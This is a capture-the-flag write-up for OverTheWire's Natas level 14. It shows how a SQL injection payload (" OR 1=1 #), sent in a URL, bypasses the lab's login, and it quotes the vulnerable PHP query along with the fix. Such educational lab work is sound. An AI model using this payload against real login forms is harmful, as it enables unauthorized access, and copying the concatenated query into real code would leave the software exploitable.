# Natas Level 14 

## Objective

Exploit an SQL Injection vulnerability in the login page to bypass authentication and obtain the password for the next level.

**URL:** `http://natas14.natas.labs.overthewire.org`
**Username:** `natas14`
**Password:** `<password from Natas 13>`

---

## Enumeration

After logging in, the page presents a simple username and password form.

Inspecting the source code reveals that the application builds the SQL query by directly concatenating user input:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

Since the values from `$_REQUEST` are inserted into the query without any sanitization or prepared statements, the application is vulnerable to **SQL Injection**.

---

## Vulnerability

The application trusts user-supplied input and directly appends it to the SQL query. By injecting SQL syntax into the `username` parameter, we can alter the query logic and bypass authentication.

The payload used is:

```text
" OR 1=1 #
```

* `"` closes the original string.
* `OR 1=1` creates a condition that is always true.
* `#` comments out the remainder of the SQL statement.

---

## Exploitation

Since the application accepts request parameters through `$_REQUEST`, the payload can be supplied directly in the URL.

Navigate to:

```text
http://natas14.natas.labs.overthewire.org/index.php?username=%22%20OR%201%3D1%20%23&password=
```

The URL-encoded payload is decoded by the server, resulting in the following SQL query:

```sql
SELECT * from users where username="" OR 1=1 # " and password=""
```

Because `OR 1=1` always evaluates to true, the database returns at least one record. The `#` character comments out the rest of the query, including the password check.

As a result, the login succeeds and the page displays the password for **natas15**.

---

## Why This Works

The application dynamically constructs SQL queries using untrusted user input:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

Without input validation or parameterized queries, an attacker can inject SQL code and modify the intended logic of the statement. In this case, the injected condition `OR 1=1` causes the query to always return a valid result.

---



**Flag:** Password for `natas15` obtained by exploiting an SQL Injection vulnerability in the login form.

---

## ScreenShots
<img width="1891" height="492" alt="image" src="https://github.com/user-attachments/assets/3727a3ee-e103-4203-90fa-bcf7652a3849" />



<img width="1900" height="667" alt="image" src="https://github.com/user-attachments/assets/ebcfc72e-f486-4fef-a89a-23fdca1381f6" />



